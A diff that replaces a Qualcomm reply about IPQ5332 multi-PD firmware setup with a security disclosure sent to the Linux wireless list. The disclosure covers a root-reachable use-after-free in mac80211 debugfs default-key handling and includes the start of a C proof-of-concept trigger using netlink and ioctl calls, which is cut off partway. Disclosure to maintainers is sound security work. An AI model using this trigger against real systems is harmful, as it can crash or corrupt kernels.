@@ -1,267 +1,617 @@
-Received: from mx0a-0031df01.pphosted.com (mx0a-0031df01.pphosted.com [205.220.168.131])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pg1-f170.google.com (mail-pg1-f170.google.com [209.85.215.170])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A8E754908D2
-	for <linux-wireless@vger.kernel.org>; Mon,  7 Sep 2026 12:23:18 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=205.220.168.131
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 358894477F3
+	for <linux-wireless@vger.kernel.org>; Mon,  7 Sep 2026 12:27:26 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.170
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788783800; cv=none; b=di+O16hydYQzZe8jfeyAqE61A/DsVvUVHj1u69kjAJL5w5j1dbcMHPZRDZ+hTWSPGi5lwsDNV0sXF01E7zxdekzkDLN/n+5ZsHD3kGLNHy9T+C9Zn3F12RkpyFNnAYqcubBaBBhnskJEQqZW9G4NeiNSMfTtvAuwVy/12y0FlJg=
+	t=1788784048; cv=none; b=KgTAMffU15edDixvU/hLVK65aw5RjdhGDZt+CDt0fUl2QVDRFfZFzs/Sftah6JFHA9du1t0icd7G32vffSKcXvehJ0PeYOO/wSYRcKSVn60epWI4UM8wF6D8JknItyyi6YL28aV+WVCQZUfptjC1HkkFSFfbCwj6e4lD+6yxoCQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788783800; c=relaxed/simple;
-	bh=/XM0H/BpFes8SMdWxdYnx0QwysVEnKtoRTcf0Nut+jU=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=pQ/rZwCAU2NvMAF0GibO5X0Ol4YocCE5iDW9+cOSzpTOO+5tw2cSQz6UNkXLhRJCGyTwf479vP1Xk18xE2TgdZlTRXKx6SEChixP5xhB5JBTe7G0IANXkhCsjrBAUSqTC+BRM3l5ToMyB9VU9TDpPNqt9EOrbv1OhmBwO25VmtM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com; spf=pass smtp.mailfrom=oss.qualcomm.com; dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b=K1yfMNWN; dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b=JREZrrbY; arc=none smtp.client-ip=205.220.168.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	s=arc-20240116; t=1788784048; c=relaxed/simple;
+	bh=blyKrfANhD3NPUbEXm59hw1j07YMb5bNPWqFnxlRknw=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=HGxppJxHg67BI4XmuPfwnHS4z83+uucilniHetyt9uQnmUfNuQRRka9nJ49pnFqXjmRk3sypErBca8KD7FupCH2ViVNcOfkrDtSPrLdE/dpZ7QF1J1/PfDHUvc+8cXJ9SXoQCRdBmmNUkpzjWwzKzbX/poWUJvwy5GKQGhtbl0M=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=KMFxHbUK; arc=none smtp.client-ip=209.85.215.170
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b="K1yfMNWN";
-	dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b="JREZrrbY"
-Received: from pps.filterd (m0279865.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 687AvS4O496314
-	for <linux-wireless@vger.kernel.org>; Mon, 7 Sep 2026 12:23:18 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	98atpqeEqErvQfy5RYHFK/T1sDHuewTFDWq2WDqd5Sc=; b=K1yfMNWNwBBEvCHc
-	OoQnFrYTTT2rLDg0t36O3FatvedHHgGqIlzewxJab26AD2yABThHluPPSBD5PMVf
-	2ldRPUZj9GcB5ha1OpHzVa7glAr2Pl4GMC5a/9RLcf+OxHYbl2THrzXsNua9dLez
-	sFQ/unJDvaKo96IyQgtkMnuPXKn8apYKoohRK8GJnnSLRWPBvIMIQKAZ1/Y/98KB
-	gnUWpVanbXz20Trjk53Hm1wLWOHoMzHeCt5t7Cnk+j/GERGYnHdHk7ygwpcj7Hgw
-	dYgmufwI7y3LfgGN6IHHgw15RkBOFymZFV6iffBpW0/Rw+auFlPc9aydr9BG+17z
-	EBY/nQ==
-Received: from mail-pf1-f200.google.com (mail-pf1-f200.google.com [209.85.210.200])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4ghuyk892y-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-wireless@vger.kernel.org>; Mon, 07 Sep 2026 12:23:17 +0000 (GMT)
-Received: by mail-pf1-f200.google.com with SMTP id d2e1a72fcca58-85f1f3620bcso4334145b3a.0
-        for <linux-wireless@vger.kernel.org>; Mon, 07 Sep 2026 05:23:17 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="KMFxHbUK"
+Received: by mail-pg1-f170.google.com with SMTP id 41be03b00d2f7-ca80d708489so2512952a12.1
+        for <linux-wireless@vger.kernel.org>; Mon, 07 Sep 2026 05:27:26 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1788783797; x=1789388597; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=98atpqeEqErvQfy5RYHFK/T1sDHuewTFDWq2WDqd5Sc=;
-        b=JREZrrbYoN4j2MEofQ1gV6H0dqIXlKGVYAVXv3sob8QkLe4rtTvkAQLqHfQ8ou3BQ8
-         JtjpXPhLPdVKESyVo67z3As62BR9p50cLq7nGC4rfVnwgkzjWCov67VpTkExVK3iKGuJ
-         vgcaBamdudkIBvQJbxsk4OHYrbxK47lL11A0g+4wNcyn0/yAWN0YhcOYkHTYoOIb5NuJ
-         KcmSY5L2KNbWzPFUezjtwCPqnSWQn9Rq0CfXPaTGBfUgSmDjJsUlNC36EwkuE+ZhSoFN
-         X9muF9XR9qFAEYhrOa88YcHFjVpzbHkkAMlMyT13WCEcItpGXGzl3xmXuiQKIunz6tc2
-         hyFw==
+        d=nebusec.ai; s=google; t=1788784045; x=1789388845; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=Mo9pQT7K4lvnrNrtwgCS5Cx6UVc4ZEaPfIbgvoMfd8M=;
+        b=KMFxHbUKPkPpriQcmSW0QnditzNc7l3lYGpUL/4BFdEyFIllaTGcFewn/+m7csrpur
+         McI6H/8WUuPm/gqar8Gc0CiCATfAACyr0kkbZzzm8OgEHzvQEhtIlTca3u70spYVX3a3
+         +CsV/n9sUBpkE10xAT46w1OWqCxbFqLlfWQM/5y26FUD418IC8gW2KpU5M544UUcE7fB
+         g345WwIjEjakBdK/ccDqRrZ8xyHbAvnKWp0YWuanvMJSMTIhFCOOvM/YHJgY07iisJcU
+         1SYPUjO7feTMwvGE5KTqBIpLCWQautYQWlza5sUFy9lmmtRfzIe0ZvJYEpr6D4Uulz2m
+         h9aQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788783797; x=1789388597;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=1e100.net; s=20251104; t=1788784045; x=1789388845;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=98atpqeEqErvQfy5RYHFK/T1sDHuewTFDWq2WDqd5Sc=;
-        b=mGVRdahxcDQWBcHsc7cZOkHeIrXUbckCivuarI5OTAZ2mhTIwxGSW6pZFXSF6unpmB
-         UX5PIEpQ+/9Vxv7P+BXNHW2O/yWxMfxCBDuUEwEjgdF0MWPFEquBUcot3sdpYff1tvZv
-         madG1tj3lXfQKgtxV3ePnwO+aNknO77DKTya3ZhJI6uFrPr6SiUOLnIVksYuQ1ymMKMt
-         7cfDSk/N8+2AYzcgZjH1426BOknj97aJYuWIU5Opvv9TGVTAbeUi8TyPJESCgygqACH/
-         GpV8BdUgg+K5dv2Mzl9vX/aCdwwYByqiembGWOBBORHrZt8KdCqtfRQiVwN726vhjGvp
-         PZpw==
-X-Forwarded-Encrypted: i=1; AKwUvBzufmmbhYd4xSed/fMk59/F3YhRVTjIF09HMXXznurK4Czb4M1LBLqK90F/1IjTSJm51+Ta2hZ9SVYHhNpttw==@vger.kernel.org
-X-Gm-Message-State: AFuF++l9LKH5JIOB238tOnh6X3qlk1W3mhsGuso52b83wzB0sR4nUd1e
-	a6LH3PKPXP6zrD+27gGm2Tji72F++4TY06qOWRHqRep5EmqW3sAiygf82Zzh99LZew3eYO/Okm2
-	dDmwHXHCH8y7UlmJ9oqjjxjTOcaBvIOKZjK5xNWomiy8rTREg6WCz4A8iQx2pIxRSBBNZQB2hYo
-	TmcQ==
-X-Gm-Gg: AYBFou0pARAgGzFVaLg+j/P8jxPbRs59ukkQjLXTqJw/MDSUD5COmYWtaRqKc4wMEh2
-	M4FHSn4vIigptJERG/4+fVVlm8nNIC+uWzhfsG139I8Tkt3K/h79HzEgJVu+mf1kC6YJxi1yhtU
-	lr/hgi/T+eY5xAbN1t2y1k2JTpw6fYXxgzm4xdYtYQzrbi7rdbUEjF1azX3lcJ+mQfai10AOEIX
-	SGW7eV8gyF2NVuXtvrZE6vv/bJr5LxM9S/Bf8beZEmEctpqMOAgAo0swyQ3UDUM83JsOxPaBp1c
-	DUV6UuOGDn+jaCabj7bBEDvWLAqL6y3QZEJH21C4x5C6N2HViBa+beCTJNPgs+X6duZGHg2Ps++
-	yqoGYOZA0KeAl428N5J3MF9foifbGLHFDdzM=
-X-Received: by 2002:a05:6a20:1602:b0:3d3:aed2:6f23 with SMTP id adf61e73a8af0-3da21638008mr27894221637.23.1788783796932;
-        Mon, 07 Sep 2026 05:23:16 -0700 (PDT)
-X-Received: by 2002:a05:6a20:1602:b0:3d3:aed2:6f23 with SMTP id adf61e73a8af0-3da21638008mr27894181637.23.1788783796321;
-        Mon, 07 Sep 2026 05:23:16 -0700 (PDT)
-Received: from [172.20.10.2] ([152.59.48.104])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-338778fb926sm2794285eec.31.2026.09.07.05.23.11
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Mon, 07 Sep 2026 05:23:15 -0700 (PDT)
-Message-ID: <dd02ef49-2e37-497b-9a37-32a5b2c93539@oss.qualcomm.com>
-Date: Mon, 7 Sep 2026 17:53:09 +0530
+        bh=Mo9pQT7K4lvnrNrtwgCS5Cx6UVc4ZEaPfIbgvoMfd8M=;
+        b=smnuZg1FXqAoruO1icBrmcfPnetW3xvM88og/41TbFfGRxXSgbtGWIezc4ky7mOwcU
+         nIkabjMa7ngi6SjLgbLZ4kBTtF4jm19D323e72O7SF4zG6zGfNhVxJ8tjsfhSG78MGsh
+         rxOjMuQGXzmmG7BqF8LPcnAnaqoCGtlM+GhzG5mQOX7UJi3Qr+DUPMXfFT8XDfuywCfj
+         CjlzC8Vt0G2e0U75e/uHgFHnO/xAEd4PEEoN9RvS7pwpclQ+IvEZjLqyKUCZ1pwfssAP
+         hMbnlT7mGObCAjNWXYtSumd6fHMxHIBY6n2F6b8xs9QYQBLVQ3B8X1mpeQg+vTs6rF/R
+         ZpOQ==
+X-Gm-Message-State: AFuF++nZvjpcXoOkICEPDNhg/IZDpGfHCjw7k97vsXU+s6Y2Sq0W/96M
+	+xaEFJ2sAl46RBW7ngL/8ob8GwWht6Vep53hQ2GsHX/nOnGj9OxTZGQx+kF9bbfcAqWNfN/D9di
+	QAWJ2Bg==
+X-Gm-Gg: AYBFou0pzbYMvBf6GrKLqK+o+ej03uzxzhBjmiqOj7VOvdY3+5L3uemWJFy1ToP2VRp
+	fKSWzel9N+iMIWrvjVzlJ+N5QrU95LEKJX30NF/r+P08JStLdXlOB5LIuAkISsDV43UIU2nylTe
+	uh35jXR8fUhRUya+aQ2X/FllDZ8h3iNNeY7wSYHppKH4ZvFIvKbkNkggtHHCPMC81B8HXJ8w5sj
+	tLEWoUv7HXTNWQRi9CeTjyt58eO0qgKKh7zwNEsysunJJcS8g9NMGl9pW3GENA/lm/CAgIRFkK/
+	IvIysrMGCdbc7/+QpD+PIGXtclK+aXm0eLb7jISyl03KITCnS4l8Q+VtnfL/zQpZGz61WyEnr4Z
+	I2LBZ6ZDzyiMZqw3rjzA77/ebF63Qje1qeaV0jUDxZUsFzL5jLNYNo3EE6GTwCA/H6JthuXSggR
+	AAUbLYNDR0hBBKruEIvBBx2D9oIWpJ81icsCmZzKJxVk4Tp7r+dFNFY0IfqOQO7SBqDtsh
+X-Received: by 2002:a17:90a:c88f:b0:380:8bb9:aba9 with SMTP id 98e67ed59e1d1-39b07f3216bmr30941126a91.3.1788784045099;
+        Mon, 07 Sep 2026 05:27:25 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1432435648esm32122104c88.5.2026.09.07.05.27.22
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 07 Sep 2026 05:27:24 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: linux-wireless@vger.kernel.org
+Cc: johannes@sipsolutions.net,
+	gregory.greenman@intel.com,
+	miriam.rachel.korenblit@intel.com,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH wireless 0/1] wifi: mac80211: reset default-key debugfs after netdev recreate
+Date: Mon,  7 Sep 2026 20:27:12 +0800
+Message-ID: <cover.1788783312.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: linux-wireless@vger.kernel.org
 List-Id: <linux-wireless.vger.kernel.org>
 List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: IPQ5332 multipd: missing text PD level and qcom,rproc ownership
-To: Hideo Sumi <hideo.sumi@mugops.com>
-Cc: Manikanta Mylavarapu <quic_mmanikan@quicinc.com>,
-        Jeff Johnson <jjohnson@kernel.org>,
-        Bjorn Andersson <andersson@kernel.org>,
-        Mathieu Poirier <mathieu.poirier@linaro.org>,
-        linux-remoteproc@vger.kernel.org, linux-arm-msm@vger.kernel.org,
-        ath12k@lists.infradead.org, linux-wireless@vger.kernel.org,
-        vignesh.viswanathan@oss.qualcomm.com
-References: <20260902041339.7665-1-hideo.sumi@mugops.com>
- <741d7c3e-6eea-4a84-bf4c-8d8eb8032c83@oss.qualcomm.com>
- <20260902192434.54709-1-hideo.sumi@mugops.com>
- <9103ca95-5e27-4979-994c-e14f123cec7e@oss.qualcomm.com>
- <20260903124238.59908-1-hideo.sumi@mugops.com>
-Content-Language: en-US
-From: Aaradhana Sahu <aaradhana.sahu@oss.qualcomm.com>
-In-Reply-To: <20260903124238.59908-1-hideo.sumi@mugops.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-Proofpoint-Spam-Info: AW1haW4tMjYwOTA3MDEzNyBTYWx0ZWRfX8jPRP/HFCiEb
- QVAWaQgOuretdrvn/r17ia11R73uwUzSFYDXUXQ1m489f/AVGMh5uTdHnRJZwKVMrZbvEevmClO
- LROkvKbU+n3g5M6I7o7nY8Qex9/A71g=
-X-Proofpoint-GUID: kiig5lh2a6XIdyXJbmoR2Ngo5NgKG4TS
-X-Authority-Analysis: v=2.4 cv=ObSoyBTY c=1 sm=1 tr=0 ts=6a9eacb5 cx=c_pps
- a=mDZGXZTwRPZaeRUbqKGCBw==:117 a=LjvNJr9HdsU1EkKhf9BFDQ==:17
- a=IkcTkHD0fZMA:10 a=VdqzKS8jKosA:10 a=s4-Qcg_JpJYA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=u7WPNUs3qKkmUXheDGA7:22 a=Um2Pa8k9VHT-vaBCBUpS:22
- a=aTTwR_pdSoFANY7pt1YA:9 a=QEXdDO2ut3YA:10 a=zc0IvFSfCIW2DFIPzwfm:22
-X-Proofpoint-ORIG-GUID: kiig5lh2a6XIdyXJbmoR2Ngo5NgKG4TS
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwOTA3MDEzNyBTYWx0ZWRfXxfopkYg8OX0R
- QJhObpG1N9qfSHoXKa+lroy/E3CL3B41aK2BBhtyZyYSs9ICgt9lSldb3Hryffqhy5bOVbTpSxf
- g6d8jKv6nbt/xWmIvgvaEr8XOfJfq9rHr4+2p9dRW6uzIy4sJ4I7F92cOYXhNwt6iAiGXoz2rUR
- dNRpLgVh8AriRHKAZV56+0KNx9oKL1rs9oTrfd6FxJEs5zTv+CsftrnmPbW1MxN7nAUpmtm2ouc
- 7fkCuHKHJXfUzJ3I5T/PwHITlyTfM8xwOItjspWww9A/yN+Gg+teyyIGJFF+cDue3YeHFpVh2qn
- Y4o9ktJYpiNiJI+8UTnjci7ecaABsX/YpA/G+shxhpaV+qBF3lZoOzl/VfaYcybPZnDIIvYVZr5
- GshsSrwggST1mRI5kpOCs66vtT34z7JT5yl8SK89+9Tl3yeaPNhpECggrpy/Qu8kpLT7prXug6e
- ep1ZjSN9xqH2L5Eiw5Q==
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.134,FMLib:17.12.100.49
- definitions=2026-09-07_03,2026-09-07_01,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- suspectscore=0 lowpriorityscore=0 impostorscore=0 adultscore=0 phishscore=0
- priorityscore=1501 malwarescore=0 clxscore=1015 bulkscore=0 spamscore=0
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2606150000 definitions=main-2609070137
+Content-Transfer-Encoding: 8bit
 
+Hi Linux kernel maintainers,
 
+We found and validated an issue in net/mac80211/debugfs_key.c and
+net/mac80211/debugfs_netdev.c. The bug is reachable by a root user.
 
-On 9/3/2026 6:12 PM, Hideo Sumi wrote:
-> On 9/3/2026, Aaradhana Sahu wrote:
->> Before we look into the SMEM handling, could you please confirm whether
->> you are using the latest ath.git ToT and whether the remoteproc v14
->> series is included?
-> 
-> No on both counts, and thank you for the pointer -- I had not seen v14.
-> Let me be precise about the base so we compare like for like, and then
-> ask you the one question that would settle most of this.
-> 
-> This is an OpenWrt build, not ath.git ToT:
-> 
->   - kernel 6.18.44
->   - ath12k from the OpenWrt "backports-6.18.39" package
->   - the multipd remoteproc support is the *old* series: Manikanta
->     Mylavarapu's original multipd patches (Nov 2023) plus Ziyang Huang's
->     "split q6_wcss to rootpd and userpd" fixes (Sep 2024), carried as
->     OpenWrt target patches.
-> 
-> It does not include your v14 series. So it is very possible the issues I
-> raised are already addressed there, and I do not want to send you
-> chasing a three-year-old base.
-> 
-> The core of my first mail was a *text PD* level between the root PD and
-> the user PDs, which the vendor firmware for this part requires and which
-> the 2023/2024 series does not model, so I added it locally:
-> 
->   q6v5_wcss   qcom,ipq5332-q6-mpd         q6_fw0.mdt   root PD
->     text-pd   qcom,ipq5332-mpd-upd-text   q6_fw3.mdt   shared RO text
->       pd1                                 q6_fw1.mdt   user PD
->       pd2                                 q6_fw2.mdt   user PD
-> 
-> So the question that would settle it: does the v14 series introduce this
-> text-PD level (a shared read-only text image loaded between root and
-> user PDs)? If it does, my local patch is redundant and the right move is
-> simply to use v14 -- no need to debug the old base at all. You wrote the
-> series, so you can answer that far faster than I can by porting it.
-> 
-> I am glad to help validate v14 on this hardware if that is useful -- if
-> you can point me at the base it is meant to apply on (ath.git ToT plus
-> the series, or a branch), I will build it for IPQ5332 and report what
-> reproduces. I would just rather not promise a blind full rebase, since
-> 2.4 GHz already works here on the old base and I do not want to trade a
-> working setup for guesswork. The OpenWrt device support proceeds on the
-> current base regardless; the upstream question is only about landing on
-> your track correctly.
-> 
-> The details you asked for, in any case:
-> 
-> Firmware version, from the Q6 error record:
-> 
->   WLAN.WBE.1.3.2-00067-QCAHKSWPL_SILICONZ-1.128291.1.135427.1
-> 
-> Platform: Qualcomm IPQ5332 (Xiaomi BE3600 Pro). Two on-chip WiFi
-> devices, two user PDs, both attached to the single Q6 root PD via the
-> shared text PD:
-> 
->   - wifi0 / pd1: on-chip QCA5332, 2.4 GHz, AHB
->   - wifi1 / pd2: QCN6432, 5 GHz
-> 
-> The multipd DT (our downstream form on the old base):
-> 
->   &q6v5_wcss {
->       firmware-name = "ath12k/IPQ5332/hw1.0/q6_fw0.mdt",
->                       "ath12k/IPQ5332/hw1.0/iu_fw.mdt",
->                       "ath12k/QCN6432/hw1.0/iu_fw.mdt";
->       status = "okay";
-> 
->       text-pd3 {
->           compatible = "qcom,ipq5332-mpd-upd-text";
->           firmware-name = "ath12k/IPQ5332/hw1.0/q6_fw3.mdt";
-> 
->           pd1 {  /* wifi0, 2.4 GHz */
->               firmware-name = "ath12k/IPQ5332/hw1.0/q6_fw1.mdt";
->               interrupts-extended =
->                   <&wcss_smp2p_in 8 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 9 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 12 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 11 IRQ_TYPE_NONE>;
->               interrupt-names = "fatal", "ready",
->                                 "spawn-ack", "stop-ack";
->               qcom,smem-states = <&wcss_smp2p_out 8>,
->                                  <&wcss_smp2p_out 9>,
->                                  <&wcss_smp2p_out 10>;
->               qcom,smem-state-names = "shutdown", "stop", "spawn";
->           };
-> 
->           pd2 {  /* wifi1, 5 GHz */
->               firmware-name = "ath12k/IPQ5332/hw1.0/q6_fw2.mdt";
->               interrupts-extended =
->                   <&wcss_smp2p_in 16 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 17 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 20 IRQ_TYPE_NONE>,
->                   <&wcss_smp2p_in 19 IRQ_TYPE_NONE>;
->               interrupt-names = "fatal", "ready",
->                                 "spawn-ack", "stop-ack";
->               qcom,smem-states = <&wcss_smp2p_out 16>,
->                                  <&wcss_smp2p_out 17>,
->                                  <&wcss_smp2p_out 18>;
->               qcom,smem-state-names = "shutdown", "stop", "spawn";
->           };
->       };
->   };
-> 
->   &wifi0 { qcom,rproc = <&wcss_upd1>; status = "okay"; };  /* pd1 */
->   &wifi1 { qcom,rproc = <&wcss_upd2>; status = "okay"; };  /* pd2 */
-> 
-> Thanks,
-> Hideo
+We've tested it, and it should not affect any other functionality.
 
-Thanks for providing the details. This helps clarify the setup.
+We will provide detailed information about the bug in this email, along
+with a PoC to trigger it.
 
-I checked the backports-6.18.39 code you are using. With that version of the Multi-PD implementation,
-the root PD and the Text PD handling is done by the remoteproc side, so for the issues related to the
-Text PD, I think it would be better to confirm the expected behavior with the remoteproc team.
+---- details below ----
 
-Regarding the latest ath.git ToT + remoteproc v14 series, please note that the firmware you are currently using:
-WLAN.WBE.1.3.2-00067-QCAHKSWPL_SILICONZ-1.128291.1.135427.1
+Bug details:
 
-may not be directly compatible with the latest upstream flow. The WCSS secure PIL flow expects the Q6 DTB
-rather than the bootargs-based flow.
+ieee80211_debugfs_key_update_default() keeps dentry pointers for the
+default unicast and multicast key symlinks.
+ieee80211_debugfs_recreate_netdev() can recursively remove the parent
+netdev debugfs directory while those keys remain installed, for example
+when adding the first MLO link. It clears the parent and stations
+pointers, but not the child key dentries, then creates a new parent
+directory.
 
-I am also not yet sure whether the v14 remoteproc series contains all the changes required for the complete
-Multi-PD bringup on IPQ5332.
+A later default-key update passes the freed dentries to debugfs_remove().
+That is a use-after-free.
 
-I have added Vignesh from the remoteproc team to help clarify the Text PD handling, and also whether v14 is
-sufficient for the IPQ5332 Multi-PD setup.
+Clear the stale default-key dentry pointers when the netdev debugfs tree
+is removed, and recreate the symlinks after the directory is rebuilt.
+
+Reproducer:
+
+    make
+    ./poc.sh wlan0
+
+The kernel must be booted with mac80211_hwsim.mlo=1.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+    #define _GNU_SOURCE
+    
+    #include <errno.h>
+    #include <linux/nl80211.h>
+    #include <net/ethernet.h>
+    #include <net/if.h>
+    #include <netlink/attr.h>
+    #include <netlink/genl/ctrl.h>
+    #include <netlink/genl/genl.h>
+    #include <netlink/msg.h>
+    #include <netlink/netlink.h>
+    #include <stdbool.h>
+    #include <stdint.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/ioctl.h>
+    #include <sys/socket.h>
+    #include <unistd.h>
+    
+    #ifndef WLAN_CIPHER_SUITE_WEP40
+    #define WLAN_CIPHER_SUITE_WEP40 0x000FAC01
+    #endif
+    
+    static int ack_error_cb(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg)
+    {
+    	(void)nla;
+    	*(int *)arg = err->error;
+    	return NL_STOP;
+    }
+    
+    static int ack_cb(struct nl_msg *msg, void *arg)
+    {
+    	(void)msg;
+    	*(int *)arg = 0;
+    	return NL_STOP;
+    }
+    
+    static int finish_cb(struct nl_msg *msg, void *arg)
+    {
+    	(void)msg;
+    	(void)arg;
+    	return NL_SKIP;
+    }
+    
+    static int no_seq_check_cb(struct nl_msg *msg, void *arg)
+    {
+    	(void)msg;
+    	(void)arg;
+    	return NL_OK;
+    }
+    
+    static int nl_talk(struct nl_sock *sock, struct nl_msg *msg)
+    {
+    	struct nl_cb *cb;
+    	int err = 1;
+    
+    	if (nl_send_auto(sock, msg) < 0)
+    		return -EIO;
+    
+    	cb = nl_cb_alloc(NL_CB_DEFAULT);
+    	if (!cb)
+    		return -ENOMEM;
+    
+    	nl_cb_set(cb, NL_CB_ACK, NL_CB_CUSTOM, ack_cb, &err);
+    	nl_cb_set(cb, NL_CB_FINISH, NL_CB_CUSTOM, finish_cb, &err);
+    	nl_cb_set(cb, NL_CB_SEQ_CHECK, NL_CB_CUSTOM, no_seq_check_cb, NULL);
+    	nl_cb_err(cb, NL_CB_CUSTOM, ack_error_cb, &err);
+    
+    	while (err > 0) {
+    		int rc = nl_recvmsgs(sock, cb);
+    
+    		if (rc < 0) {
+    			err = rc;
+    			break;
+    		}
+    	}
+    
+    	nl_cb_put(cb);
+    	return err;
+    }
+    
+    static int open_ioctl_socket(void)
+    {
+    	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    
+    	if (fd < 0)
+    		perror("socket(AF_INET, SOCK_DGRAM)");
+    	return fd;
+    }
+    
+    static int set_if_updown(int fd, const char *ifname, bool up)
+    {
+    	struct ifreq ifr;
+    
+    	memset(&ifr, 0, sizeof(ifr));
+    	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+    
+    	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
+    		perror("SIOCGIFFLAGS");
+    		return -1;
+    	}
+    
+    	if (up)
+    		ifr.ifr_flags |= IFF_UP;
+    	else
+    		ifr.ifr_flags &= ~IFF_UP;
+    
+    	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
+    		perror("SIOCSIFFLAGS");
+    		return -1;
+    	}
+    
+    	return 0;
+    }
+    
+    static int set_iftype(struct nl_sock *sock, int family_id, int ifindex, int iftype)
+    {
+    	struct nl_msg *msg;
+    	int err;
+    
+    	msg = nlmsg_alloc();
+    	if (!msg)
+    		return -ENOMEM;
+    
+    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
+    			 NL80211_CMD_SET_INTERFACE, 0) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFTYPE, iftype)) {
+    		nlmsg_free(msg);
